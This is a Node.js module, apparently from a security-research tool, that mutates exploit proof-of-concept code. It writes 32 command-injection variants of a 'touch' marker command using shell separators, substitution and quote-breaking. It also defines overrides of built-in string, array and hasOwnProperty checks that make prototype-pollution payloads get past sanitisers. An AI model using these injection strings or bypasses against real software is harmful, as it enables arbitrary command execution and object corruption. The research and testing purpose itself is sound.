const ast_replacer = require("../ast_modifiers/ast_replacer")
const object_replacer = require("../ast_modifiers/object_replacer")
const ast_adder = require("../ast_modifiers/ast_adder")
const path = require("path")
const fs = require("fs");

let file_name_count = 1

function createFile(filePath,code){
    // ---- path handling ----
    const dir = path.dirname(filePath);
    const fullBase = path.basename(filePath); // full filename with all extensions

    // Split at first dot
    const dotIndex = fullBase.indexOf(".");
    let base, restExt;
    if (dotIndex !== -1) {
      base = fullBase.slice(0, dotIndex);
      restExt = fullBase.slice(dotIndex); // includes all remaining extensions
    } else {
      base = fullBase;
      restExt = "";
    }

    const outPath = path.join(dir, `${base}_${file_name_count}${restExt}`);
    if(fs.existsSync(outPath)){
      file_name_count++;
      createFile(filePath,code)
    }else{
      fs.writeFileSync(outPath, code, "utf-8");
    }
    file_name_count++;
}

function variant_caller(arr,filePath){
  
  const code_to_be_added1 = `
    String.prototype.includes = () => false;
    String.prototype.startsWith = () => false;
    String.prototype.endsWith = () => false;
    String.prototype.indexOf = () => -1;
    String.prototype.lastIndexOf = () => false;
    String.prototype.match = () => false;
    String.prototype.search = () => false;
    String.prototype.matchAll = () => false;

    Array.prototype.includes = () => false;
	  Array.prototype.indexOf = () => -1
    `;

  const code_to_be_added2 = `
    Array.prototype.includes = function(key){
			  if(key == "__proto__" || key == "constructor" || key == "prototype" || key == "polluted"){
				return false
			  }else{
				return true
			  }
			};`

  const code_to_be_added3 = `Object.prototype.hasOwnProperty.call = () => true;`
  const code_to_be_added4 = `Object.prototype.hasOwnProperty = () => true;`
  const code_to_be_added5 = `RegExp.prototype.test = () => false;`
  const code_to_be_added6 = `Reflect.getPrototypeOf = () => false;`
  const code_to_be_added7 = `
  var arg = ['__proto__'];
	var flag1 = true 
	arg.toString = function(){
		if(flag1){
		  flag1 = false 
		  return 'foo'
		}else{
		  return '__proto__'
		}
		
	  }

	String.prototype.split = function(){
	  return [arg, 'polluted']
	}`

  const code_to_be_added8 = `
  var arg1 = ['constructor'];
	var arg2 = ['prototype'];
	var flag1 = true 
	var flag2 = true 
	arg1.toString = function(){
		if(flag1){
		  flag1 = false 
		  return 'foo'
		}else{
		  return 'constructor'
		}
		
	  }
	  
	arg2.toString = function(){
		if(flag2){
		  flag2 = false 
		  return 'foo'
		}else{
		  return 'prototype'
		}
		
	  }

	String.prototype.split = function(){
	  return [arg1, arg2, 'polluted']
	}`

  const code_to_be_added9 = `
  var obj = {}
		obj.__proto__.polluted = undefined;
		Object.defineProperty(obj, "__proto__", {
		  value: obj.__proto__,
		  writable: true,
		  enumerable: true,
		  configurable: true
		});
  `

  const code_to_be_added10 = `
  var obj = {}
  obj.constructor.prototype.polluted = undefined;
  Object.defineProperty(obj, "constructor", {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
  });
  `
  const code_to_be_added11 = `RegExp.prototype.test = () => true;`

  for(let i=0; i < arr.length; i++){
    const og_code = arr[i]
    //console.log(i)
    try{
      createFile(filePath,ast_adder(code_to_be_added1,og_code))
      createFile(filePath,ast_adder(code_to_be_added2,og_code))
      createFile(filePath,ast_adder(code_to_be_added3,og_code))
      createFile(filePath,ast_adder(code_to_be_added4,og_code))
      createFile(filePath,ast_adder(code_to_be_added5,og_code))
      createFile(filePath,ast_adder(code_to_be_added6,og_code))
      createFile(filePath,ast_adder(code_to_be_added7,og_code))
      createFile(filePath,ast_adder(code_to_be_added8,og_code))
      createFile(filePath,object_replacer(code_to_be_added9,og_code))
      createFile(filePath,object_replacer(code_to_be_added10,og_code))
      createFile(filePath,ast_adder(code_to_be_added11,og_code))
 
    }catch(e){
      continue
      //console.log(e)
    }
    
    //createFile(arr[i])
  }
  

}



function touch_string_literal_handler(filePath,code,value,type){

  const regex = /touch\s+([^\s;&|#`)"']+)/;

  if(regex.test(value)){
    var match = value.match(regex);
    var package_name = match[1];

    var code1 = ast_replacer("string_literal",value,";touch " + package_name, code)
    var code2 = ast_replacer("string_literal",value," & touch " + package_name, code)
    var code3 = ast_replacer("string_literal",value,'"; touch ' + package_name + '#', code)
    var code4 = ast_replacer("string_literal",value,"& touch " + package_name + " &", code)
    var code5 = ast_replacer("string_literal",value,";touch " + package_name + ";", code)
    var code6 = ast_replacer("string_literal",value,"$(touch " + package_name + ")", code)
    var code7 = ast_replacer("string_literal",value,"./; touch " + package_name, code)
    var code8 = ast_replacer("string_literal",value,"touch " + package_name, code)
    var code9 = ast_replacer("string_literal",value,"') touch " + package_name + "# '", code)
    var code10 = ast_replacer("string_literal",value," ' & touch " + package_name + "# '", code)
    var code11 = ast_replacer("string_literal",value,'" & touch ' + package_name + '"', code)
    var code12 = ast_replacer("string_literal",value,"n || touch " + package_name + "; #", code)
    var code13 = ast_replacer("string_literal",value,"/ ;touch " + package_name, code)
    var code14 = ast_replacer("string_literal",value,'"; touch ' + package_name + ';"', code)
    var code15 = ast_replacer("string_literal",value,"test; touch " + package_name + ";", code)
    var code16 = ast_replacer("string_literal",value,". || touch " + package_name, code)
    var code17 = ast_replacer("string_literal",value,";touch " + package_name + ";#", code)
    var code18 = ast_replacer("string_literal",value,"`touch " + package_name + "`", code)
    var code19 = ast_replacer("string_literal",value,"test; touch " + package_name + "; #", code)
    var code20 = ast_replacer("string_literal",value,"$(touch " + package_name + "); #", code)
    var code21 = ast_replacer("string_literal",value,"& touch " + package_name + "#", code)
    var code22 = ast_replacer("string_literal",value,";touch " + package_name + "; echo ", code)
    var code23 = ast_replacer("string_literal",value,"/; touch " + package_name, code)
    var code24 = ast_replacer("string_literal",value,"https://github.com; touch " + package_name + "; #", code)
    var code25 = ast_replacer("string_literal",value,'""`touch ' + package_name + '`', code)
    var code26 = ast_replacer("string_literal",value,'";touch ' + package_name + '#"', code)
    var code27 = ast_replacer("string_literal",value,"11; $(touch " + package_name + ")", code)
    var code28 = ast_replacer("string_literal",value,"127.0.0.1; touch " + package_name + ";", code)
    var code29 = ast_replacer("string_literal",value,"& touch " + package_name + "; #", code)
    var code30 = ast_replacer("string_literal",value,"bar`touch " + package_name + "`", code)
    var code31 = ast_replacer("string_literal",value,"|| touch " + package_name, code)
    var code32 = ast_replacer("string_literal",value,"`touch " + package_name + ";`", code)
    
    createFile(filePath,code1)
    createFile(filePath,code2)
    createFile(filePath,code3)
    createFile(filePath,code4)
    createFile(filePath,code5)
    createFile(filePath,code6)
    createFile(filePath,code7)
    createFile(filePath,code8)
    createFile(filePath,code9)
    createFile(filePath,code10)
    createFile(filePath,code11)
    createFile(filePath,code12)
    createFile(filePath,code13)
    createFile(filePath,code14)
    createFile(filePath,code15)
    createFile(filePath,code16)
    createFile(filePath,code17)
    createFile(filePath,code18)
    createFile(filePath,code19)
    createFile(filePath,code20)
    createFile(filePath,code21)
    createFile(filePath,code22)
    createFile(filePath,code23)
    createFile(filePath,code24)
    createFile(filePath,code25)
    createFile(filePath,code26)
    createFile(filePath,code27)
    createFile(filePath,code28)
    createFile(filePath,code29)
    createFile(filePath,code30)
    createFile(filePath,code31)
    createFile(filePath,code32)
    //variant_caller([code1,code],filePath)
  
  }

}

module.exports = touch_string_literal_handler
